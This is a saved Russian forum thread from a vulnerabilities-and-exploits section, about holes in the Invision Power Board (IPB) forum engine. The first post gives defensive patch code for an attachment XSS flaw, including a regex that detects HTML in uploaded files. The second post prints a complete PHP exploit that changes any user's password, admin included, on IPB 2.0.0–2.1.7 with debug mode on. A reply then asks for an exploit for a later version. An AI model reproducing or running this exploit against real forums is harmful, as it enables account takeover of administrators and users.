<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="ru" xml:lang="ru"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" /><meta http-equiv="content-style-type" content="text/css" /><meta http-equiv="content-language" content="ru" /><meta http-equiv="imagetoolbar" content="no" /><meta name="resource-type" content="document" /><meta name="distribution" content="global" /><meta name="keywords" content="" /><meta name="description" content="Действительно Полезный форум" /><meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1" />
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.0/jquery.min.js"></script><!--[if lte IE 6]><script src="http://vrublevsky.org/noie6/noie6.js"></script><![endif]--><script type="text/javascript" src="./styles/prosilver/template/jquery.splash.js"></script><title>Уязвимости форума IPB и их устранение - Уязвимости и эксплойты - Форум Mega Obzor</title><link rel="canonical" href="http://forum.megaobzor.com/viewtopic.php?f=50&amp;t=2398" /><link rel="alternate" type="application/atom+xml" title="Новые темы" href="http://forum.megaobzor.com/feed.php?mode=topics" /><link rel="alternate" type="application/atom+xml" title="Форум - Уязвимости и эксплойты" href="http://forum.megaobzor.com/feed.php?f=50" /><link rel="alternate" type="application/atom+xml" title="Тема - Уязвимости форума IPB и их устранение" href="http://forum.megaobzor.com/feed.php?f=50&amp;t=2398" /><script type="text/javascript"
 src="http://megaobzor.com/javascripts/jwplayer.js"></script><script type="text/javascript">// <![CDATA[
var jump_page = 'Введите номер страницы, на которую хотите перейти:';
var on_page = '1';
var per_page = '10';
var base_url = './viewtopic.php?f=50&amp;t=2398&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a';

/**
* Find a member
*/
function find_username(url)
{
popup(url, 760, 570, '_usersearch');
return false;
}
// ]]></script><script type="text/javascript" src="./styles/prosilver/template/forum_fn.js"></script>
<link href="./styles/prosilver/theme/print.css" rel="stylesheet" type="text/css" media="print" title="printonly" /><link href="./style.php?id=1&amp;lang=ru&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" rel="stylesheet" type="text/css" media="screen, projection" /></head>
<body id="phpbb" class="section-viewtopic ltr">
<div id="wrap"><a id="top" name="top" accesskey="t"></a><p class="skiplink"><a href="#start_here">Пропустить</a></p><div id="top-menu">
</div>
<div id="page-header"><table border="0" width="100%"><tr><td width="60%" align="left"><a href="/"><img src="http://megaobzor.com/images/logo.jpg" alt="MegaObzor"></a></td><td width="40%" align="right"><script src="http://megaobzor.com/Newtop.js" charset="windows-1251"></script></td></tr></table><span class="clear"></span><ul id="main-menu"><li><a href="./index.php?sid=41cb0d0b2bd68889d75904888b8b4b4a">Форумы</a><ul><li><a style="background-position: 0 -18px;" href="./index.php?sid=41cb0d0b2bd68889d75904888b8b4b4a">Список форумов</a></li><li><a style="background-position: 0 -36px;" href="./search.php?search_id=active_topics&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a">Активные темы</a></li><li><a style="background-position: 0 -72px;" href="./search.php?search_id=unanswered&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a">Темы без ответов</a></li><li><a style="background-position: 0 -108px;" href="./search.php?sid=41cb0d0b2bd68889d75904888b8b4b4a">Поиск в форумах</a></li></ul></li><li><a href="http://megaobzor.com">MegaObzor</a></li>
<li><a href="./ucp.php?mode=register&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a">Регистрация</a></li><li style="float: right; border-right: 0;"><a href="./ucp.php?mode=login&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a">Вход</a></li>
<li style="float: right; border-left: 0; height: 25px;"><div id="search-box"><form action="./search.php?sid=41cb0d0b2bd68889d75904888b8b4b4a" method="get" id="search"><fieldset><input name="keywords" id="keywords" type="text" maxlength="128" title="Ключевые слова" class="inputbox search" value="Поиск…" onclick="if(this.value=='Поиск…')this.value='';" onblur="if(this.value=='')this.value='Поиск…';" /> 
<input class="button2" value="Поиск" type="submit" /><input type="hidden" name="sf" value="titleonly" />
<input type="hidden" name="sr" value="topics" />
<input type="hidden" name="sid" value="41cb0d0b2bd68889d75904888b8b4b4a" />

</fieldset></form></div></li>
</ul></div>
<a name="start_here"></a><div id="page-body"><h2><a href="./viewtopic.php?f=50&amp;t=2398&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a">Уязвимости форума IPB и их устранение</a></h2><ul class="header-icons"><script type="text/javascript">var url = encodeURIComponent(document.location.href);
var title = encodeURIComponent($('title').text());
document.write('<li><a target="_blank" href="http://vkontakte.ru/share.php?url='+url+'&title='+title+'" title="Поделиться в vkontakte.ru" class="icon-vkontakte">Поделиться в vkontakte.ru</a></li>');
document.write('<li><a target="_blank" href="https://plusone.google.com/_/+1/confirm?url='+url+'" title="Поделиться в Google Plus" class="icon-google-plus">Поделиться в Google Plus</a></li>');
document.write('<li><a target="_blank" href="http://facebook.com/sharer.php?u='+url+'" title="Поделиться в facebook.com" class="icon-facebook">Поделиться в facebook.com</a></li>');
document.write('<li><a target="_blank" href="http://twitter.com/intent/tweet?text='+title+'&url='+url+'" title="Поделиться в twitter.com" class="icon-twitter">Поделиться в twitter.com</a></li>');
</script><li class="icons-divider"></li><li><a href="./viewtopic.php?f=50&amp;t=2398&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a&amp;view=print" title="Версия для печати" class="icon-print">Версия для печати</a></li></ul><p class="header-path"><a href="./index.php?sid=41cb0d0b2bd68889d75904888b8b4b4a" accesskey="h">Список форумов</a>  <strong>&#8250;</strong> <a href="./viewforum.php?f=108&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a">Софт</a> <strong>&#8250;</strong> <a href="./viewforum.php?f=50&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a">Уязвимости и эксплойты</a></p>
<p style="display: none"><strong>Описание:</strong> Обзор уязвимостей и защита движков порталов, движков форумов, чатов. Раздел направлен на защиту всех известных движков.<br /><strong>Модераторы:</strong> <a href="./memberlist.php?mode=viewprofile&amp;u=10524&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" style="color: #CC0000;" class="username-coloured">Queen Clarion</a>, <a href="./memberlist.php?mode=viewprofile&amp;u=13718&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" style="color: #CC0000;" class="username-coloured">HardMind</a>, <a href="./memberlist.php?mode=viewprofile&amp;u=10505&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" style="color: #CC0000;" class="username-coloured">ReAl_rus</a>, <a href="./memberlist.php?mode=viewprofile&amp;u=4313&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" style="color: #6600FF;" class="username-coloured">shaman</a><br /></p><div class="topic-actions">
<div class="buttons"><div class="reply-icon"><a href="./posting.php?mode=reply&amp;f=50&amp;t=2398&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" title="Ответить"><span></span>Ответить</a></div></div>
<div class="search-box"><form method="get" id="topic-search" action="./search.php?sid=41cb0d0b2bd68889d75904888b8b4b4a"><fieldset><input class="inputbox search tiny" type="text" name="keywords" id="search_keywords" size="20" value="Поиск в теме…" onclick="if(this.value=='Поиск в теме…')this.value='';" onblur="if(this.value=='')this.value='Поиск в теме…';" /><input class="button2" type="submit" value="Поиск" /><input type="hidden" name="t" value="2398" />
<input type="hidden" name="sf" value="msgonly" />
<input type="hidden" name="sid" value="41cb0d0b2bd68889d75904888b8b4b4a" />

</fieldset></form></div><div class="pagination">Сообщений: 12
 &bull; <a href="#" onclick="jumpto(); return false;" title="Перейти на страницу…">Страница 1 из 2</a> &bull; <span><strong>1</strong><span class="page-sep">, </span><a href="./viewtopic.php?f=50&amp;t=2398&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a&amp;start=10">2</a></span></div>
</div><div class="clear"></div>
<div id="p36526" class="post bg2"><div class="inner"><span class="corners-top"><span></span></span>
<div class="postbody"><h3 class="first"><a href="#p36526">Уязвимости форума IPB и их устранение</a></h3><p class="author"><a href="./viewtopic.php?p=36526&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a#p36526"><img src="./styles/prosilver/imageset/icon_post_target.gif" width="11" height="9" alt="Сообщение" title="Сообщение" /></a> <strong><a href="./memberlist.php?mode=viewprofile&amp;u=2&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" style="color: #ff8000;" class="username-coloured">Lenar</a></strong> &raquo; 18 июн 2007 01:52 </p>

<div class="content"><span style="font-weight: bold">XSS инъекция в ipb 2.1.x и 2.2.x</span>
<br />
<br />XSS инъекция через прикрепляемые файлы Уязвимость возникает из-за того что Invision Power Board позволяет пользователю загрузить изображение или PDF файл, содержащий JavaScript. Данный скрипт срабатывает при открытии прикрепления пользователем, так как это происходит в контексте браузерной сессии это позволяет злоумышленнику получить всю информацию о данной сессии. Пример/Эксплоит: Нет Исправление 2.1.7: Открыть файл ./ips_kernel/class_upload.php, найти: 
<br /><dl class="codebox"><dt>Код: <a href="#" onclick="selectCode(this); return false;">Выделить всё</a></dt><dd><code>&nbsp; if &#40; $this-&gt;make_script_safe &#41;&nbsp; &#123;&nbsp; &nbsp;if &#40; preg_match&#40; &quot;/\.&#40;cgi|pl|js|asp|php|html|htm|jsp|jar&#41;$/i&quot;, $FILE_NAME &#41; &#41;&nbsp; &nbsp;&#123;&nbsp; &nbsp; $FILE_TYPE&nbsp; &nbsp; &nbsp;= 'text/plain';&nbsp; &nbsp; $this-&gt;file_extension&nbsp; &nbsp;= 'txt';&nbsp; &nbsp;&#125;&nbsp; &#125; Заменить на: CODE&nbsp; $renamed = 0;&nbsp; &nbsp; &nbsp;if &#40; $this-&gt;make_script_safe &#41;&nbsp; &nbsp;&#123;&nbsp; &nbsp; if &#40; preg_match&#40; &quot;/\.&#40;cgi|pl|js|asp|php|html|htm|jsp|jar&#41;/&quot;, $FILE_NAME &#41; &#41;&nbsp; &nbsp; &#123;&nbsp; &nbsp; &nbsp;$FILE_TYPE&nbsp; &nbsp; &nbsp;= 'text/plain';&nbsp; &nbsp; &nbsp;$this-&gt;file_extension&nbsp; &nbsp;= 'txt';&nbsp; &nbsp; &nbsp; &nbsp; $renamed = 1;&nbsp; &nbsp; &#125;&nbsp; &nbsp;&#125;</code></dd></dl> Найти:  <br />i<dl class="codebox"><dt>Код: <a href="#" onclick="selectCode(this); return false;">Выделить всё</a></dt><dd><code>f &#40; ! @move_uploaded_file&#40; $_FILES&#91; $this-&gt;upload_form_field &#93;&#91;'tmp_name'&#93;, $this-&gt;saved_upload_name&#41; &#41;&nbsp; &#123;&nbsp; &nbsp;$this-&gt;error_no = 4;&nbsp; &nbsp;return;&nbsp; &#125;&nbsp; else&nbsp; &#123;&nbsp; &nbsp;@chmod&#40; $this-&gt;saved_upload_name, 0777 &#41;;&nbsp; &#125;</code></dd></dl> Добавить после:  <br /><dl class="codebox"><dt>Код: <a href="#" onclick="selectCode(this); return false;">Выделить всё</a></dt><dd><code>if&#40; !$renamed &#41;&nbsp; &#123;&nbsp; &nbsp;$this-&gt;check_xss_infile&#40;&#41;;&nbsp; &nbsp; &nbsp;if&#40; $this-&gt;error_no &#41;&nbsp; &nbsp;&#123;&nbsp; &nbsp; return;&nbsp; &nbsp;&#125;&nbsp; &#125;</code></dd></dl> <br />Найти: <dl class="codebox"><dt>Код: <a href="#" onclick="selectCode(this); return false;">Выделить всё</a></dt><dd><code>/*-------------------------------------------------------------------------*/ // INTERNAL: Get file extension /*-------------------------------------------------------------------------*/ /** * Returns the file extension of the current filename * * @param string Filename */ function _get_file_extension&#40;$file&#41; &#123;&nbsp; return strtolower&#40; str_replace&#40; &quot;.&quot;, &quot;&quot;, substr&#40; $file, strrpos&#40; $file, '.' &#41; &#41; &#41; &#41;; &#125;</code></dd></dl> <br />Добавить перед: <br /><dl class="codebox"><dt>Код: <a href="#" onclick="selectCode(this); return false;">Выделить всё</a></dt><dd><code>CODE /*-------------------------------------------------------------------------*/ // INTERNAL: Check for XSS inside file /*-------------------------------------------------------------------------*/ /** * Checks for XSS inside file.&nbsp; If found, sets error_no to 5 and returns * * @param void */ function check_xss_infile&#40;&#41; &#123;&nbsp; // HTML added inside an inline file is not good in IE...&nbsp; &nbsp; $fh = fopen&#40; $this-&gt;saved_upload_name, 'rb' &#41;;&nbsp; &nbsp; $file_check = fread&#40; $fh, 512 &#41;;&nbsp; &nbsp; fclose&#40; $fh &#41;;&nbsp; &nbsp; if&#40; !$file_check &#41;&nbsp; &#123;&nbsp; &nbsp;@unlink&#40; $this-&gt;saved_upload_name &#41;;&nbsp; &nbsp;$this-&gt;error_no = 5;&nbsp; &nbsp;return;&nbsp; &#125;&nbsp; &nbsp; # Thanks to Nicolas Grekas from comments at www.splitbrain.org for helping to identify all vulnerable HTML tags&nbsp; &nbsp; else if&#40; preg_match&#40; &quot;#&lt;script|&lt;html|&lt;head|&lt;title|&lt;body|&lt;pre|&lt;table|&lt;a\s+href|&lt;img|&lt;plaintext#si&quot;, $file_check &#41; &#41;&nbsp; &#123;&nbsp; &nbsp;@unlink&#40; $this-&gt;saved_upload_name &#41;;&nbsp; &nbsp;$this-&gt;error_no = 5;&nbsp; &nbsp;return;&nbsp; &#125; &#125; </code></dd></dl><span style="font-weight: bold">Исправление 2.2.2:</span> <br />Открыть файл ./ips_kernel/class_upload.php, найти: <br /><dl class="codebox"><dt>Код: <a href="#" onclick="selectCode(this); return false;">Выделить всё</a></dt><dd><code>CODE&nbsp; if &#40; $this-&gt;make_script_safe &#41;&nbsp; &#123;&nbsp; &nbsp;if &#40; preg_match&#40; &quot;/\.&#40;cgi|pl|js|asp|php|html|htm|jsp|jar&#41;$/i&quot;, $FILE_NAME &#41; &#41;&nbsp; &nbsp;&#123;&nbsp; &nbsp; $FILE_TYPE&nbsp; &nbsp; &nbsp;= 'text/plain';&nbsp; &nbsp; $this-&gt;file_extension&nbsp; &nbsp;= 'txt';&nbsp; &nbsp;&#125;&nbsp; &#125; Заменить на: CODE&nbsp; $renamed = 0;&nbsp; &nbsp; &nbsp;if &#40; $this-&gt;make_script_safe &#41;&nbsp; &nbsp;&#123;&nbsp; &nbsp; if &#40; preg_match&#40; &quot;/\.&#40;cgi|pl|js|asp|php|html|htm|jsp|jar&#41;/&quot;, $FILE_NAME &#41; &#41;&nbsp; &nbsp; &#123;&nbsp; &nbsp; &nbsp;$FILE_TYPE&nbsp; &nbsp; &nbsp;= 'text/plain';&nbsp; &nbsp; &nbsp;$this-&gt;file_extension&nbsp; &nbsp;= 'txt';&nbsp; &nbsp; $this-&gt;parsed_file_name&nbsp; &nbsp; = preg_replace&#40; &quot;/\.&#40;cgi|pl|js|asp|php|html|htm|jsp|jar&#41;&#40;\.|$&#41;/i&quot;, &quot;$2&quot;, $this-&gt;parsed_file_name &#41;;&nbsp; &nbsp; &nbsp; &nbsp; $renamed = 1;&nbsp; &nbsp; &#125;&nbsp; &nbsp;&#125;</code></dd></dl> <br />Найти: <br /><dl class="codebox"><dt>Код: <a href="#" onclick="selectCode(this); return false;">Выделить всё</a></dt><dd><code>CODE&nbsp; if &#40; ! @move_uploaded_file&#40; $_FILES&#91; $this-&gt;upload_form_field &#93;&#91;'tmp_name'&#93;, $this-&gt;saved_upload_name&#41; &#41;&nbsp; &#123;&nbsp; &nbsp;$this-&gt;error_no = 4;&nbsp; &nbsp;return;&nbsp; &#125;&nbsp; else&nbsp; &#123;&nbsp; &nbsp;@chmod&#40; $this-&gt;saved_upload_name, 0777 &#41;;&nbsp; &#125; Добавить после: CODE&nbsp; if&#40; !$renamed &#41;&nbsp; &#123;&nbsp; &nbsp;$this-&gt;check_xss_infile&#40;&#41;;&nbsp; &nbsp; &nbsp;if&#40; $this-&gt;error_no &#41;&nbsp; &nbsp;&#123;&nbsp; &nbsp; return;&nbsp; &nbsp;&#125;&nbsp; &#125; </code></dd></dl>Найти: <br /><dl class="codebox"><dt>Код: <a href="#" onclick="selectCode(this); return false;">Выделить всё</a></dt><dd><code>CODE /*-------------------------------------------------------------------------*/ // INTERNAL: Get file extension /*-------------------------------------------------------------------------*/ /** * Returns the file extension of the current filename * * @param string Filename */ function _get_file_extension&#40;$file&#41; &#123;&nbsp; return strtolower&#40; str_replace&#40; &quot;.&quot;, &quot;&quot;, substr&#40; $file, strrpos&#40; $file, '.' &#41; &#41; &#41; &#41;; &#125; </code></dd></dl>Добавить перед: <br /><dl class="codebox"><dt>Код: <a href="#" onclick="selectCode(this); return false;">Выделить всё</a></dt><dd><code>CODE /*-------------------------------------------------------------------------*/ // INTERNAL: Check for XSS inside file /*-------------------------------------------------------------------------*/ /** * Checks for XSS inside file.&nbsp; If found, sets error_no to 5 and returns * * @param void */ function check_xss_infile&#40;&#41; &#123;&nbsp; // HTML added inside an inline file is not good in IE...&nbsp; &nbsp; $fh = fopen&#40; $this-&gt;saved_upload_name, 'rb' &#41;;&nbsp; &nbsp; $file_check = fread&#40; $fh, 512 &#41;;&nbsp; &nbsp; fclose&#40; $fh &#41;;&nbsp; &nbsp; if&#40; !$file_check &#41;&nbsp; &#123;&nbsp; &nbsp;@unlink&#40; $this-&gt;saved_upload_name &#41;;&nbsp; &nbsp;$this-&gt;error_no = 5;&nbsp; &nbsp;return;&nbsp; &#125;&nbsp; &nbsp; # Thanks to Nicolas Grekas from comments at www.splitbrain.org for helping to identify all vulnerable HTML tags&nbsp; &nbsp; else if&#40; preg_match&#40; &quot;#&lt;script|&lt;html|&lt;head|&lt;title|&lt;body|&lt;pre|&lt;table|&lt;a\s+href|&lt;img|&lt;plaintext#si&quot;, $file_check &#41; &#41;&nbsp; &#123;&nbsp; &nbsp;@unlink&#40; $this-&gt;saved_upload_name &#41;;&nbsp; &nbsp;$this-&gt;error_no = 5;&nbsp; &nbsp;return;&nbsp; &#125; &#125; </code></dd></dl>
<br />Скачать измененный файл для версий 2.1.x: <!-- m --><a class="postlink" href="http://forums.invisionpower.com/">http://forums.invisionpower.com/</a><!-- m --> 
<br />Скачать измененный файл для версий 2.2.x: <!-- m --><a class="postlink" href="http://forums.invisionpower.com/">http://forums.invisionpower.com/</a><!-- m --></div><div id="sig36526" class="signature">Спорьте, заблуждайтесь, ошибайтесь, но, ради бога, размышляйте, и хотя криво, да сами.
<br /><img src="http://megaobzor.com/load/forum/adminlich.gif" alt="Изображение" />
<br />Серьезное лицо - еще не признак ума, господа. Вы улыбайтесь, господа, улыбайтесь!</div>
</div>
<dl class="postprofile" id="profile36526"><dt><span style="font-size: 1.1em;"><a href="./memberlist.php?mode=viewprofile&amp;u=2&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" style="color: #ff8000;" class="username-coloured">Lenar</a></span> <img src="./styles/prosilver/theme/images/icon_gender_m.gif" title="Пол: Мужской" alt="M" /></dt><dd>Местный Босс</dd><dd><img src="./images/ranks/r10.gif" alt="Местный Босс" title="Местный Босс" /></dd><dd><a href="./memberlist.php?mode=viewprofile&amp;u=2&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a"><img src="./download/file.php?avatar=2_1318920352.gif" width="100" height="100" alt="Аватара пользователя" /></a></dd><dd><strong>Откуда:</strong> Казань</dd><dd><strong>Сообщения:</strong> 11725</dd><dd><strong>Медали:</strong> 12</dd><dd><img src="./images/medals/Medal-5.gif" border="0" alt="Ораторская (11)" title="Ораторская (11)"   /><img src="./images/medals/Medal-4.gif" border="0" alt="Творец MegaObzor (1)" title="Творец MegaObzor (1)"   /></dd><dd><ul class="profile-icons"><li class="skype-icon"><a href="skype:lenarsmm?chat" title="Skype"><span>Skype</span></a></li></ul></dd>
</dl>
<div class="back2top"><a href="#wrap" class="top" title="Вернуться к началу">Вернуться к началу</a></div>
<span class="corners-bottom"><span></span></span></div></div>
<hr class="divider" /><div id="p51066" class="post bg1"><div class="inner"><span class="corners-top"><span></span></span>
<div class="postbody"><p class="author"><a href="./viewtopic.php?p=51066&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a#p51066"><img src="./styles/prosilver/imageset/icon_post_target.gif" width="11" height="9" alt="Сообщение" title="Сообщение" /></a> <strong><a href="./memberlist.php?mode=viewprofile&amp;u=2&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" style="color: #ff8000;" class="username-coloured">Lenar</a></strong> &raquo; 29 фев 2008 19:11 </p>

<div class="content"><span style="font-weight: bold">Invision Power Board v2.1.7</span> Remote Password Change Exploit
<br /><dl class="codebox"><dt>Код: <a href="#" onclick="selectCode(this); return false;">Выделить всё</a></dt><dd><code>&lt;?php <br />/* <br /><br />&nbsp;Debug Mode password change vulnerability <br />&nbsp;Affects Invision Power Borard 2.0.0 to 2.1.7 <br />&nbsp;by Rapigator <br />&nbsp; <br />&nbsp;This works if: <br /><br />&nbsp;&quot;Debug Level&quot; is set to 3 <br />&nbsp;or <br />&nbsp;Enable SQL Debug Mode is turned on <br />&nbsp; <br />&nbsp;In General Configuration of the forum software. <br /><br />*/ <br /><br />// The forum's address up to and including 'index.php' <br />$site = &quot;http://localhost/forums/index.php&quot;; <br /><br />// An existing user's login name <br />$name = &quot;admin&quot;; <br /><br />// The new password&#40;3-32 characters&#41; <br />$pass = &quot;1234&quot;; <br /><br />// You can use a proxy... <br />// $proxy = &quot;1.2.3.4:8080&quot;; <br /><br /><br /><br />// ----------------------------- <br />$site .= &quot;?&quot;; <br />$suffix = &quot;&quot;; <br />$name = urlencode&#40;$name&#41;; <br />$pass = urlencode&#40;$pass&#41;; <br />$curl = curl_init&#40;$site.'act=Reg&amp;CODE=10'&#41;; <br />curl_setopt&#40;$curl, CURLOPT_PROXY, $proxy&#41;; <br />curl_setopt&#40;$curl, CURLOPT_RETURNTRANSFER, 1&#41;; <br />curl_setopt&#40;$curl, CURLOPT_TIMEOUT, 10&#41;; <br />$page = curl_exec&#40;$curl&#41;; <br />curl_close&#40;$curl&#41;; <br />if &#40;preg_match&#40;'/&lt;span class=\'green\'&gt;INSERT&lt;\/span&gt; INTO &lt;span class=\'purple\'&gt;&#40;&#91;\\w&#93;*?&#41;_reg_antispam&lt;\/span&gt; \\&#40;regid,regcode,ip_address,ctime\\&#41; VALUES\\&#40;\'&#40;&#91;\\w&#93;&#123;32&#125;?&#41;\',&#40;&#91;\\d&#93;*?&#41;,/', $page, $regs&#41;&#41; &#123; <br />$prefix = $regs&#91;1&#93;; <br />$regid = $regs&#91;2&#93;; <br />$regcode = $regs&#91;3&#93;; <br />&#125; else &#123; <br />$suffix = &quot;&amp;debug=1&quot;; <br />$curl = curl_init&#40;$site.'act=Reg&amp;CODE=10'.$suffix&#41;; <br />curl_setopt&#40;$curl, CURLOPT_PROXY, $proxy&#41;; <br />curl_setopt&#40;$curl, CURLOPT_RETURNTRANSFER, 1&#41;; <br />curl_setopt&#40;$curl, CURLOPT_TIMEOUT, 10&#41;; <br />$page = curl_exec&#40;$curl&#41;; <br />curl_close&#40;$curl&#41;; <br />if &#40;preg_match&#40;'/INSERT INTO &#40;&#91;\\w&#93;*?&#41;_reg_antispam \\&#40;regid,regcode,ip_address,ctime\\&#41; VALUES\\&#40;\'&#40;&#91;\\w&#93;&#123;32&#125;?&#41;\',&#40;&#91;\\d&#93;*?&#41;,/', $page, $regs&#41;&#41; &#123; <br />$prefix = $regs&#91;1&#93;; <br />$regid = $regs&#91;2&#93;; <br />$regcode = $regs&#91;3&#93;; <br />&#125; <br />&#125; <br />if &#40;!isset&#40;$regid&#41; || !isset&#40;$regcode&#41;&#41; &#123; <br />echo &quot;Error: Probably not vulnerable, or no forum found&quot;; <br />exit; <br />&#125; <br /><br />$curl = curl_init&#40;$site.$suffix&#41;; <br />curl_setopt&#40;$curl, CURLOPT_PROXY, $proxy&#41;; <br />curl_setopt&#40;$curl, CURLOPT_RETURNTRANSFER, 1&#41;; <br />curl_setopt&#40;$curl, CURLOPT_POST, 1&#41;; <br />curl_setopt&#40;$curl, CURLOPT_POSTFIELDS, &quot;act=Reg&amp;CODE=11&amp;member_name=&#123;$name&#125;&amp;regid=&#123;$regid&#125;&amp;reg_code=&#123;$regcode&#125;&quot;&#41;; <br />curl_setopt&#40;$curl, CURLOPT_TIMEOUT, 10&#41;; <br />$page = curl_exec&#40;$curl&#41;; <br />curl_close&#40;$curl&#41;; <br />if &#40;preg_match&#40;'/&lt;span class=\'green\'&gt;INSERT&lt;\/span&gt; INTO &lt;span class=\'purple\'&gt;'.$prefix.'_validating&lt;\/span&gt; \\&#40;vid,member_id,real_group,temp_group,entry_date,&nbsp; coppa_user,lost_pass,ip_address\\&#41; VALUES\\&#40;\'&#40;&#91;\\w&#93;&#123;32&#125;?&#41;\',&#40;&#91;\\d&#93;&#123;1,32&#125;?&#41;,/', $page, $regs&#41;&#41; &#123; <br />change_pass&#40;$regcode,$regid,$regs&#91;1&#93;,$regs&#91;2&#93;&#41;; <br />&#125; <br />if &#40;preg_match&#40;'/INSERT INTO '.$prefix.'_validating \\&#40;vid,member_id,real_group,temp_group,entry_date,&nbsp; coppa_user,lost_pass,ip_address\\&#41; VALUES\\&#40;\'&#40;&#91;\\w&#93;&#123;32&#125;?&#41;\',&#40;&#91;\\d&#93;&#123;1,32&#125;?&#41;,/', $page, $regs&#41;&#41; &#123; <br />change_pass&#40;$regcode,$regid,$regs&#91;1&#93;,$regs&#91;2&#93;&#41;; <br />&#125; <br /><br />function change_pass&#40;$regcode,$regid,$vid,$userid&#41; &#123; <br />global $site, $proxy, $name, $pass; <br />$curl = curl_init&#40;$site.$suffix&#41;; <br />curl_setopt&#40;$curl, CURLOPT_PROXY, $proxy&#41;; <br />curl_setopt&#40;$curl, CURLOPT_RETURNTRANSFER, 1&#41;; <br />curl_setopt&#40;$curl, CURLOPT_POST, 1&#41;; <br />curl_setopt&#40;$curl, CURLOPT_POSTFIELDS, &quot;act=Reg&amp;CODE=03&amp;type=lostpass&amp;uid=&#123;$userid&#125;&amp;aid=&#123;$vid&#125;&amp;regid=&#123;$regid&#125;&amp;reg_code=&#123;$regcode&#125;&amp;pass1=&#123;$pass&#125;&amp;pass2=&#123;$pass&#125;&quot;&#41;; <br />curl_setopt&#40;$curl, CURLOPT_TIMEOUT, 10&#41;; <br />$page = curl_exec&#40;$curl&#41;; <br />curl_close&#40;$curl&#41;; <br />echo &quot;Password Changed!&quot;; <br />exit; <br />&#125; <br />?&gt;</code></dd></dl></div><div id="sig51066" class="signature">Спорьте, заблуждайтесь, ошибайтесь, но, ради бога, размышляйте, и хотя криво, да сами.
<br /><img src="http://megaobzor.com/load/forum/adminlich.gif" alt="Изображение" />
<br />Серьезное лицо - еще не признак ума, господа. Вы улыбайтесь, господа, улыбайтесь!</div>
</div>
<dl class="postprofile" id="profile51066"><dt><span style="font-size: 1.1em;"><a href="./memberlist.php?mode=viewprofile&amp;u=2&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" style="color: #ff8000;" class="username-coloured">Lenar</a></span> <img src="./styles/prosilver/theme/images/icon_gender_m.gif" title="Пол: Мужской" alt="M" /></dt><dd>Местный Босс</dd><dd><img src="./images/ranks/r10.gif" alt="Местный Босс" title="Местный Босс" /></dd><dd><a href="./memberlist.php?mode=viewprofile&amp;u=2&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a"><img src="./download/file.php?avatar=2_1318920352.gif" width="100" height="100" alt="Аватара пользователя" /></a></dd><dd><strong>Откуда:</strong> Казань</dd><dd><strong>Сообщения:</strong> 11725</dd><dd><strong>Медали:</strong> 12</dd><dd><img src="./images/medals/Medal-5.gif" border="0" alt="Ораторская (11)" title="Ораторская (11)"   /><img src="./images/medals/Medal-4.gif" border="0" alt="Творец MegaObzor (1)" title="Творец MegaObzor (1)"   /></dd><dd><ul class="profile-icons"><li class="skype-icon"><a href="skype:lenarsmm?chat" title="Skype"><span>Skype</span></a></li></ul></dd>
</dl>
<div class="back2top"><a href="#wrap" class="top" title="Вернуться к началу">Вернуться к началу</a></div>
<span class="corners-bottom"><span></span></span></div></div>
<hr class="divider" /><div id="p51067" class="post bg2"><div class="inner"><span class="corners-top"><span></span></span>
<div class="postbody"><p class="author"><a href="./viewtopic.php?p=51067&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a#p51067"><img src="./styles/prosilver/imageset/icon_post_target.gif" width="11" height="9" alt="Сообщение" title="Сообщение" /></a> <strong><a href="./memberlist.php?mode=viewprofile&amp;u=2863&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" style="color: #6600FF;" class="username-coloured">svn</a></strong> &raquo; 29 фев 2008 19:13 </p>

<div class="content"><span style="font-weight: bold">Lenar</span>, а к 2.3.4 слабо выложить?  <img src="./images/smilies/13.gif" alt="*13" title="" /></div>
</div>
<dl class="postprofile" id="profile51067"><dt><span style="font-size: 1.1em;"><a href="./memberlist.php?mode=viewprofile&amp;u=2863&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" style="color: #6600FF;" class="username-coloured">svn</a></span></dt><dd>Ветеран</dd><dd><img src="./images/ranks/r15.gif" alt="Ветеран" title="Ветеран" /></dd><dd><strong>Откуда:</strong> UA</dd><dd><strong>Сообщения:</strong> 826</dd>
</dl>
<div class="back2top"><a href="#wrap" class="top" title="Вернуться к началу">Вернуться к началу</a></div>
<span class="corners-bottom"><span></span></span></div></div>
<hr class="divider" /><div id="p51069" class="post bg1"><div class="inner"><span class="corners-top"><span></span></span>
<div class="postbody"><p class="author"><a href="./viewtopic.php?p=51069&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a#p51069"><img src="./styles/prosilver/imageset/icon_post_target.gif" width="11" height="9" alt="Сообщение" title="Сообщение" /></a> <strong><a href="./memberlist.php?mode=viewprofile&amp;u=2&amp;sid=41cb0d0b2bd68889d75904888b8b4b4a" style="color: #ff8000;" class="username-coloured">Lenar</a></strong> &raquo; 29 фев 2008 19:16 </p>

<div class="content">Invision Power Board v2.2.2
